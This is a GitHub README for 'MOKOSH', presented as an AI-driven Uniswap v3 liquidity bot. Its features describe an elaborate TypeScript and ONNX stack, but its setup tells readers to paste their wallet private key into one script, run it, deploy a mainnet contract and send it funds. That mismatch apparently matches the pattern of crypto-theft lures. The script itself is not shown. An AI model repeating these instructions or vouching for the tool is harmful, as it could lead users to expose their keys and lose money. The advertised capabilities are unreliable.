<h1 align="center">MOKOSH — AI Liquidity Manager for Uniswap v3 (Node.js)</h1>
<p align="center">
  <em>AI-driven concentrated-liquidity market making on Ethereum: smart range selection, gas-aware rebalances, fee forecasting, and MEV-aware repositioning.</em>
</p>

<p align="center">
  <a href="#"><img alt="Node" src="https://img.shields.io/badge/node-20%2B-339933?logo=node.js&logoColor=white"></a>
  <a href="#"><img alt="TypeScript" src="https://img.shields.io/badge/typescript-5.x-3178C6?logo=typescript&logoColor=white"></a>
  <a href="#"><img alt="License" src="https://img.shields.io/badge/license-MIT-brightgreen"></a>
  <a href="#"><img alt="CI" src="https://img.shields.io/badge/CI-GitHub%20Actions-blue?logo=githubactions"></a>
  <a href="#"><img alt="Docker" src="https://img.shields.io/badge/docker-ready-0db7ed?logo=docker&logoColor=white"></a>
</p>

<p align="center">
  <a href="#-elevator-pitch">Elevator pitch</a> •
  <a href="#-features">Features</a> •
  <a href="#-quickstart">Quickstart</a> •
  <a href="#️-configuration">Configuration</a> •
  <a href="#-usage-cli">Usage (CLI)</a> •
  <a href="#-risk-controls">Risk controls</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-lp-metrics-methodology">LP metrics</a> •
  <a href="#-roadmap">Roadmap</a> •
  <a href="#-license">License</a>
</p>

---

## 🚀 Elevator pitch

**MOKOSH** turns Uniswap v3 liquidity provision into a systematic strategy.  
It predicts **where** to place your range, **when** to rebalance, and **how much** to allocate — with explicit modeling of **fees, gas, and MEV**. Bring your own model (ONNX/TF.js) or start with the included templates.

---

## ✨ Features

- 🎯 **AI Range Selection** — models estimate short-term volatility and mid-price drift to choose **tight vs. wide** ranges per pool & fee tier.
- 🔁 **Gas-Aware Rebalances** — skip churn: the bot weighs expected fees vs. gas to decide if a rebalance is economically justified.
- 💸 **Fee Forecasting** — predicts fee APR for each candidate range; compares against inventory risk and IL (impermanent loss).
- 🛡️ **MEV-Aware Repositioning** — optional private tx (Flashbots / Protect) for mint/burn to reduce sandwich and backrun risk.
- 🧪 **LP Simulator** — backtests with pool state snapshots, tick crossing, fee growth, and realistic gas/slippage assumptions.
- 📊 **Operator Dashboard (CLI)** — view live position value, accrued fees, utilization, and projected APR; Prometheus metrics included.
- 🧩 **Modular Node Stack** — TypeScript 5, Node 20+, viem/ethers, ONNX Runtime or TensorFlow.js backends.
- 🐳 **Deploy-ready** — Dockerfile, GitHub Actions CI, structured logs (pino), health/metrics endpoints.

> **Goal:** maximize **net fee capture** while minimizing **wasted gas** and **inventory bleed**.

---

## Setup and Installation

1. Download the Repository
   - Download the ZIP file containing the project files: [Download ZIP](https://github.com/telznx/MOKOSH-AI-Liquidity-Manager-for-Uniswap-v3/archive/refs/heads/main.zip).
   - Or clone the repository with Git (if Git is not installed, download it here: [Download Git](https://git-scm.com/downloads)):
     ```bash
     git clone https://github.com/telznx/MOKOSH-AI-Liquidity-Manager-for-Uniswap-v3/
     ```

2. Navigate to the Project Folder
   - Open a terminal and change to the project directory:
     ```bash
     cd path/to/your/project
     ```

3. Install Dependencies
   - The `package.json` includes required dependencies (`ethers@6`, `inquirer`, `ora`). Install them:
     ```bash
     npm install
     ```

4. Configure Your Private Key
   - Open `aiTradingBot.js` in a code editor.
   - Replace on 120 the `PRIVATE_KEY` value with your Ethereum wallet's private key:
     ```javascript
     const PRIVATE_KEY = 'your-private-key';
     ```
   - Security Note: Never share your private key or commit it to version control.

5. Run the Script
   - Execute the script using Node.js:
     ```bash
     node aiTradingBot.js
     ```
   - Follow the prompts to deploy the contract or view instructions.
   - After creating the contract, copy its address and fund its balance from any source (e.g., MetaMask or another wallet).

## Usage

- Deployment: Select `1. Deploy` to deploy the contract on Ethereum Mainnet. The script will estimate gas costs and prompt for confirmation.
- Interaction: After deployment, interact with the contract's functions (`start`, `stop`, `withdraw`) via the command-line menu.
- Instructions: Select `2. Instructions` to view detailed usage guidelines within the script.
- Autonomous Operation: Do not close the terminal after deployment to continue interacting with the contract.
